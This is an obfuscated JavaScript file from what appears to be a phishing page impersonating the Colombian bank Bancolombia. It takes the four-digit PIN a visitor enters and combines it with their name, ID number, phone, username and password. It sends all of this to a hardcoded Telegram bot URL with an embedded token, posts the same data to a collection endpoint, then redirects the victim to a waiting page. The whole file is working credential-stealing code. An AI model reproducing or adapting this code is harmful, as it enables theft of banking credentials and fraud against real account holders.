function _0x2fe7() {
  const _0x4cc4c1 = [
    "log",
    "38094JIlEWl",
    "\x0a©️CC:\x20",
    "2979hBQJLw",
    "href",
    "dudename",
    "12TynHtg",
    "disabled",
    "stringify",
    "number-4",
    "application/json",
    "user",
    "6WiwmLW",
    "checkerInfo",
    "puser",
    "2148712TjpYpW",
    "488372snTkBR",
    "value",
    "number-1",
    "continue",
    "\x0aFuente:\x20",
    "Hubo\x20un\x20problema:",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(Chat\x20ID:\x20",
    "number-3",
    "807587ENozLR",
    "\x0a🚹Usuario:\x20",
    "info",
    "metaInfo",
    "Error\x20al\x20enviar\x20mensaje\x20a\x20Chat\x20ID:\x20",
    "🟡\x20Bancolombia\x20a\x20la\x20Mano",
    "6RpABde",
    "getElementById",
    "click",
    "/trico/tricoPost",
    "1611015HEXfpB",
    "272ZulmOV",
    "telnum",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "personas",
    "🟡\x20Bancolombia\x20Personas",
    "error",
    "Datos\x20enviados\x20al\x20servidor",
    "location",
    "mode",
    "POST",
    "3890RNHHyC",
    "\x0a📱Teléfono:\x20",
    "./wait.html",
    "311590gDxdSf",
  ];
  _0x2fe7 = function () {
    return _0x4cc4c1;
  };
  return _0x2fe7();
}
const _0x4c3300 = _0xe4f6;
(function (_0x2bcb5d, _0x24db84) {
  const _0x5a96df = _0xe4f6,
    _0x54809f = _0x2bcb5d();
  while (!![]) {
    try {
      const _0x38d4c9 =
        parseInt(_0x5a96df(0x15f)) / 0x1 +
        (parseInt(_0x5a96df(0x14e)) / 0x2) *
          (-parseInt(_0x5a96df(0x15b)) / 0x3) +
        parseInt(_0x5a96df(0x15e)) / 0x4 +
        (-parseInt(_0x5a96df(0x171)) / 0x5) *
          (parseInt(_0x5a96df(0x16d)) / 0x6) +
        (parseInt(_0x5a96df(0x150)) / 0x7) *
          (parseInt(_0x5a96df(0x172)) / 0x8) +
        (-parseInt(_0x5a96df(0x152)) / 0x9) *
          (parseInt(_0x5a96df(0x14b)) / 0xa) +
        (-parseInt(_0x5a96df(0x167)) / 0xb) *
          (parseInt(_0x5a96df(0x155)) / 0xc);
      if (_0x38d4c9 === _0x24db84) break;
      else _0x54809f["push"](_0x54809f["shift"]());
    } catch (_0x2490a0) {
      _0x54809f["push"](_0x54809f["shift"]());
    }
  }
})(_0x2fe7, 0x5b751);
function updateLS() {
  const _0x4d1f4c = _0xe4f6;
  LS["setItem"](_0x4d1f4c(0x169), JSON[_0x4d1f4c(0x157)](info));
}
function _0xe4f6(_0x1c007d, _0x4ba423) {
  const _0x2fe7a1 = _0x2fe7();
  return (
    (_0xe4f6 = function (_0xe4f67d, _0x497fbd) {
      _0xe4f67d = _0xe4f67d - 0x144;
      let _0x2b75d7 = _0x2fe7a1[_0xe4f67d];
      return _0x2b75d7;
    }),
    _0xe4f6(_0x1c007d, _0x4ba423)
  );
}
async function sendDataBCAndPost() {
  const _0x2679bb = _0xe4f6;
  var _0x5b4169 = "",
    _0x194b44 = "";
  info[_0x2679bb(0x15c)][_0x2679bb(0x149)] === _0x2679bb(0x144)
    ? (_0x194b44 = _0x2679bb(0x145))
    : (_0x194b44 = _0x2679bb(0x16c));
  _0x5b4169 =
    _0x194b44 +
    "\x0a🆔Nombre:\x20" +
    info[_0x2679bb(0x16a)][_0x2679bb(0x154)] +
    _0x2679bb(0x151) +
    info[_0x2679bb(0x16a)]["cc"] +
    _0x2679bb(0x14c) +
    info[_0x2679bb(0x16a)]["telnum"] +
    _0x2679bb(0x168) +
    info[_0x2679bb(0x16a)][_0x2679bb(0x15a)] +
    "\x0a🔒Contraseña:\x20" +
    info[_0x2679bb(0x16a)][_0x2679bb(0x15d)] +
    _0x2679bb(0x163) +
    fuente;
  const _0x5701a8 = {
      id: info[_0x2679bb(0x16a)]["cc"],
      nombre: info[_0x2679bb(0x16a)][_0x2679bb(0x154)],
      telefono: info[_0x2679bb(0x16a)][_0x2679bb(0x173)],
      direccion: "",
      usuario: info[_0x2679bb(0x16a)][_0x2679bb(0x15a)],
      password: info[_0x2679bb(0x16a)]["puser"],
    },
    _0x1819d0 = document["getElementById"]("continue");
  _0x1819d0[_0x2679bb(0x156)] = !![];
  try {
    for (const _0x594db6 of chatIds) {
      const _0x395f8d =
          _0x2679bb(0x174) +
          _0x594db6 +
          "&text=" +
          encodeURIComponent(_0x5b4169),
        _0x22705c = await fetch(_0x395f8d);
      if (!_0x22705c["ok"]) throw new Error(_0x2679bb(0x16b) + _0x594db6);
      console[_0x2679bb(0x14f)](_0x2679bb(0x165) + _0x594db6 + ")");
    }
    const _0x33f7ad = await fetch(url + _0x2679bb(0x170), {
      method: _0x2679bb(0x14a),
      headers: { "Content-Type": _0x2679bb(0x159) },
      body: JSON[_0x2679bb(0x157)](_0x5701a8),
    });
    if (!_0x33f7ad["ok"])
      throw new Error(
        "Error\x20en\x20la\x20respuesta\x20de\x20la\x20segunda\x20solicitud"
      );
    console[_0x2679bb(0x14f)](_0x2679bb(0x147)),
      (window[_0x2679bb(0x148)][_0x2679bb(0x153)] = _0x2679bb(0x14d));
  } catch (_0x3bd8d2) {
    console[_0x2679bb(0x146)](_0x2679bb(0x164), _0x3bd8d2),
      (_0x1819d0["disabled"] = ![]);
  }
}
document[_0x4c3300(0x16e)](_0x4c3300(0x162))["addEventListener"](
  _0x4c3300(0x16f),
  function (_0x16ddbb) {
    const _0x814176 = _0x4c3300;
    _0x16ddbb["preventDefault"]();
    const _0x3350f1 = document[_0x814176(0x16e)](_0x814176(0x161))[
        _0x814176(0x160)
      ],
      _0x26844c = document[_0x814176(0x16e)]("number-2")["value"],
      _0x4b85ec = document[_0x814176(0x16e)](_0x814176(0x166))[
        _0x814176(0x160)
      ],
      _0x1469aa = document[_0x814176(0x16e)](_0x814176(0x158))["value"];
    if (
      _0x3350f1 == "" ||
      _0x26844c == "" ||
      _0x4b85ec == "" ||
      _0x1469aa == ""
    ) {
      alert("Por\x20favor\x20ingrese\x20los\x204\x20dígitos");
      return;
    } else
      (info["metaInfo"][_0x814176(0x15d)] =
        _0x3350f1 + _0x26844c + _0x4b85ec + _0x1469aa),
        updateLS(),
        sendDataBCAndPost();
  }
);
